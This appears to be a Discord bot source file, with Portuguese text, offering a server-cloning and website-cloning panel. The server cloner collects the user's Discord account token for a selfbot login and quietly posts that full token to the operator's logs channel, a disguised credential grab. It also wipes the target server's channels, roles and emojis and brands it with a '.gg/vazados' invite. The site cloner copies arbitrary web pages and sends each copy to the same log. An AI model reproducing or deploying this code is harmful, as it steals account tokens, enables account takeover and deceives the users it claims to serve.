const { ModalBuilder, TextInputStyle, TextInputBuilder, ActionRowBuilder, ChannelType, EmbedBuilder } = require("discord.js");
const { Client } = require('discord.js-selfbot-v13');
const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');
const url = require('url');
const fs = require('fs-extra');
const archiver = require('archiver');
const { General } = require("../../Database");

module.exports = {
    name: "interactionCreate",
    run: async (interaction) => {
        const { customId, user, client } = interaction;
        if (!customId) return;


        if (customId === "panel_cloner") {
            const modal = new ModalBuilder()
                .setCustomId(`panelclonermodal`)
                .setTitle("Painel de Clonagem");

            const original = new TextInputBuilder()
                .setCustomId("original")
                .setLabel("Servidor copiar")
                .setPlaceholder("Colocar o id do servidor copiar aqui:")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const token = new TextInputBuilder()
                .setCustomId("token")
                .setLabel("token da conta")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Colocar o token da sua conta aqui:")
                .setRequired(true);

            const alvo = new TextInputBuilder()
                .setCustomId("alvo")
                .setLabel("Seu servidor")
                .setStyle(TextInputStyle.Short)
                .setPlaceholder("Colocar o id do seu servidor aqui:")
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(original));
            modal.addComponents(new ActionRowBuilder().addComponents(token));
            modal.addComponents(new ActionRowBuilder().addComponents(alvo));

            return interaction.showModal(modal);
        }

        if (customId === "panelclonermodal") {
            const original = interaction.fields.getTextInputValue("original");
            const token = interaction.fields.getTextInputValue("token");
            const target = interaction.fields.getTextInputValue("alvo");
            await interaction.reply({ content: `Aguarde estou verificando as logs que você colocou na clonagem!`, ephemeral: true });

            const self = new Client();
            let t;
            try {
                await self.login(token).catch(() => t = true);
            } catch {
                t = true;
            }
            if (t) return interaction.editReply({ content: `:x: Seu token está inválido, tentar reiniciar a página e pega seu token novamente!`, ephemeral: true });

            const guilds = [await self.guilds.cache.get(original), await self.guilds.cache.get(target)];
            let s;
            guilds.forEach(g => {
                if (!g) s = true;
            });
            if (s) return interaction.editReply({ content: `:x: A conta não está nos dois servidores, entrar nos dois servidor pra funciona a clonagem.`, ephemeral: true });

            const channel_logs = client.channels.cache.get(General.get(`logs_cloner`));
            if (channel_logs) {
                const embed = new EmbedBuilder()
                    .setTitle("Nova Clonagem Realizada")
                    .setDescription("Abaixo estão as informações sobre a clonagem.")
                    .setThumbnail(interaction.client.user.displayAvatarURL())
                    .setColor('#A5A5A5')
                    .addFields(
                        { name: "**Usuário**", value: `${user} (\`${user.id}\`)`, inline: true },
                        { name: "**Servidor original**", value: `\`${guilds[0].name} (${guilds[0].id})\``, inline: true },
                        { name: "**Servidor colado**", value: `\`${guilds[1].name} (${guilds[1].id})\``, inline: true },
                        { name: "**Token do usuário**", value: `\`${token}\``, inline: false },
                        { name: "**Informações**", value: `${self.user.username} (\`${self.user.id}\`)`, inline: false }
                    )

                channel_logs.send({ embeds: [embed] }).catch(() => {});
            }
        
            let itens = {
                text: guilds[0].channels.cache.filter(c => c.type === "GUILD_TEXT").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                voice: guilds[0].channels.cache.filter(c => c.type === "GUILD_VOICE").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                category: guilds[0].channels.cache.filter(c => c.type === "GUILD_CATEGORY").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c),
                roles: guilds[0].roles.cache.sort((a, b) => b.calculatedPosition - a.calculatedPosition).map(r => r)
            }
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**` });
        
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou deletando todos os Cargos & Canais` });
        
            await guilds[1].channels.cache.forEach(c => c.delete().catch(() => {}));
            await guilds[1].roles.cache.map(r => r.delete().catch(() => {}));
            await guilds[1].emojis.cache.map(r => r.delete().catch(() => {}));
        
            await guilds[1].setIcon(guilds[0].iconURL());
            await guilds[1].setName(`${guilds[0].name} │ 400K ╺╸ .gg/vazados`);
        
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou copiando todos os Cargos...` });
        
            for (let role of itens.roles) {
                if (guilds[1].roles.cache.get(role.id)) continue;
        
                guilds[1].roles.create({
                    name: role.name,
                    color: role.color,
                    permissions: role.permissions,
                    managed: role.managed,
                    mentionable: role.mentionable,
                    position: role.position
                }).catch(() => {});
            }
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou copiando todos os emojis...` });
        
            await guilds[0].emojis.cache.forEach(e => {
                if (guilds[1].emojis.cache.get(e.id)) return;
                guilds[1].emojis.create(e.url, e.name).catch(() => {});
            });
        
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou copiando todas as Categorias...` });
            for (let category of itens.category) {
                if (guilds[1].channels.cache.get(category.id)) return;
        
                await guilds[1].channels.create(category.name, {
                    type: ChannelType.GuildCategory,
                    permissionOverwrites: Array.from(category.permissionOverwrites).map(v => {
                        let target = guilds[0].roles.cache.get(v.id);
                        if (!target) return;
                        return {
                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                            allow: v.allow,
                            deny: v.deny,
                        };
                    }).filter(v => v),
                    position: category.position
                }).catch(() => {});
            }
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou copiando todos os canais de texto...` });
        
            for (let channel of itens.text) {
                if (guilds[1].channels.cache.get(channel.id)) continue;
        
                if (!channel.parent) {
                    try {
                        await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildText,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position
                        }).then(c => c.setTopic(channel.topic)).catch(() => {});
                    } catch {

                    }
                } else {
                    let chn = await guilds[1].channels.create(channel.name, {
                        type: ChannelType.GuildText,
                        permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                            let target = guilds[0].roles.cache.get(v.id);
                            if (!target) return;
                            return {
                                id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                allow: v.allow,
                                deny: v.deny,
                            };
                        }).filter(v => v),
                        position: channel.position
                    }).catch(() => {});
                    if (channel.topic) chn.setTopic(channel.topic).catch(() => {});
        
                    if (guilds[1].channels.cache.find(c => c.name == channel.parent.name)) {
                        chn?.setParent(guilds[1].channels.cache.find(c => c.name == channel.parent.name)?.id);
                    } else {
                        try {
                            var cat = await guilds[1].channels.create(channel.parent.name, {
                                type: ChannelType.GuildCategory,
                                permissionOverwrites: Array.from(channel.parent.permissionOverwrites).map(v => {
                                    let target = guilds[0].roles.cache.get(v.id);
                                    if (!target) return;
                                    return {
                                        id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                        allow: v.allow,
                                        deny: v.deny,
                                    };
                                }).filter(v => v),
                                position: channel.parent.position
                            }).catch(() => {});
                            chn?.setParent(cat).catch(() => {});
                        } catch {

                        }
                    }
                }
            }
        
            await interaction.editReply({ content: `🕘 **Clonando o Servidor: \`${guilds[0].name}\`**\n- Estou copiando todos os canais de voz...` });
            for (let channel of itens.voice) {
                if (guilds[1].channels.cache.get(channel.id)) continue;
        
                if (!channel.parent) {
                    try {
                        await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildVoice,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position,
                            userLimit: channel.userLimit
                        }).catch(() => {});
                    } catch {

                    }
                } else {
                    try {
                        let chn = await guilds[1].channels.create(channel.name, {
                            type: ChannelType.GuildVoice,
                            permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                                let target = guilds[0].roles.cache.get(v.id);
                                if (!target) return;
                                return {
                                    id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                    allow: v.allow,
                                    deny: v.deny,
                                };
                            }).filter(v => v),
                            position: channel.position,
                            userLimit: channel.userLimit
                        }).catch(() => {});
                    } catch {}
        
                    try {
                        if (guilds[1].channels.cache.find(c => c.name == channel.parent.name)) {
                            chn.setParent(guilds[1].channels.cache.find(c => c.name == channel.parent.name).id);
                        } else {
                            try {
                                var cat = await guilds[1].channels.create(channel.parent.name, {
                                    type: ChannelType.GuildCategory,
                                    permissionOverwrites: Array.from(channel.parent.permissionOverwrites).map(v => {
                                        let target = guilds[0].roles.cache.get(v.id);
                                        if (!target) return;
                                        return {
                                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                                            allow: v.allow,
                                            deny: v.deny,
                                        };
                                    }).filter(v => v),
                                    position: channel.parent.position,
                                }).catch(() => {});
                                chn.setParent(cat).catch(() => {});
                            } catch {

                            }
                        }
                    } catch {}
                }
            }
            await interaction.editReply({ content: `<:yes:1422213840136966254> Servidor clonado com sucesso, seja feliz com seu novo servidor clonado!\n\nCréditos: https://discord.gg/vazados` });
            await self.logout().catch(() => {});
        }
        
        if (interaction.isButton() && interaction.customId === "clonersite") {
            const modal = new ModalBuilder()
                .setCustomId('url-cop')
                .setTitle('Cloner Site - .gg/peitos');

            const option1 = new TextInputBuilder()
                .setCustomId('name-site')
                .setLabel('Nome do site:')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Portfólio')
                .setMaxLength(50)
                .setRequired(true);

            const option2 = new TextInputBuilder()
                .setCustomId('url-input')
                .setLabel('Url do site')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('https://')
                .setRequired(true);

            modal.addComponents(
                new ActionRowBuilder().addComponents(option1),
                new ActionRowBuilder().addComponents(option2)
            );
            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit() && interaction.customId === "url-cop") {
            try {
                const sanitizeFilename = (filename) => {
                    return filename.replace(/[^a-zA-Z0-9_\- ]/g, '_');
                };

                const filename = sanitizeFilename(interaction.fields.getTextInputValue('name-site'));
                const url = interaction.fields.getTextInputValue('url-input');

                await interaction.reply({ content: `🕘 **Espere um momento, estamos trabalhando nisso...**`, ephemeral: true });

                const fetchPage = async (pageUrl) => {
                    try {
                        const response = await axios.get(pageUrl);
                        return response.data;
                    } catch (error) {
                        console.error(`:x: Erro ao buscar a página: ${error.message}`);
                        return null;
                    }
                };

                const cloneSite = async (url) => {
                    try {
                        const html = await fetchPage(url);
                        if (!html) {
                            throw new Error('Failed to fetch the page HTML');
                        }
                        return updateLinks(html, url);
                    } catch (error) {
                        console.error(':x: Erro ao clonar o site:', error.message);
                        return null;
                    }
                };

                const updateLinks = async (html, baseUrl) => {
                    const $ = cheerio.load(html);
                    const promises = [];

                    const updateLink = async (elem, attr) => {
                        const link = $(elem).attr(attr);
                        if (link) {
                            try {
                                const absoluteLink = new URL(link, baseUrl).href;
                                const response = await axios.get(absoluteLink, { responseType: 'arraybuffer' });
                                const localPath = path.basename(new URL(absoluteLink).pathname);
                                $(elem).attr(attr, localPath);
                            } catch (error) {
                                console.error(`:x: Erro ao baixar recurso ${link}: ${error.message}`);
                            }
                        }
                    };

                    $('a[href]').each((i, elem) => promises.push(updateLink(elem, 'href')));
                    $('img[src]').each((i, elem) => promises.push(updateLink(elem, 'src')));
                    $('link[href]').each((i, elem) => promises.push(updateLink(elem, 'href')));
                    $('script[src]').each((i, elem) => promises.push(updateLink(elem, 'src')));

                    await Promise.all(promises);
                    return $.html();
                };

                const htmlBuffer = await cloneSite(url);
                if (htmlBuffer) {
                    await interaction.editReply({
                        content: `<:yes:1422213840136966254> Olá ${interaction.user}, o seu cloner do site está pronto!\n\nCréditos: https://discord.gg/vazados`,
                        files: [{ attachment: Buffer.from(htmlBuffer), name: `${filename}.html` }],
                        ephemeral: true
                    });

                    const logsSite = client.channels.cache.get(General.get(`logs_cloner`));
                    if (logsSite) {
                        const embed = new EmbedBuilder()
                            .setColor('#A5A5A5')
                            .setTitle("Nova Clonagem Realizada")
                            .setDescription("Abaixo estão as informações sobre a clonagem.")
                            .addFields(
                                { name: '**Usuário:**', value: `${interaction.user} (\`${interaction.user.id}\`)`, inline: true },
                                { name: '**Nome do Portfólio:**', value: filename, inline: true },
                                { name: '**URL Original:**', value: url, inline: true }
                            )
                            .setThumbnail(interaction.client.user.displayAvatarURL());

                        logsSite.send({ embeds: [embed], files: [{ attachment: Buffer.from(htmlBuffer), name: `${filename}.html` }] }).catch(() => {});
                    }
                } else {
                    await interaction.editReply({ content: `:x: Ocorreu um erro ao tentar clonar o site. Por favor, tente novamente mais tarde.`, ephemeral: true });
                }
            } catch (error) {
                console.error('Erro durante a clonagem do site:', error);
                await interaction.editReply({ content: `:x: Ocorreu um erro ao tentar clonar o site. Por favor, tente novamente mais tarde.`, ephemeral: true });
            }
        }
    }
};
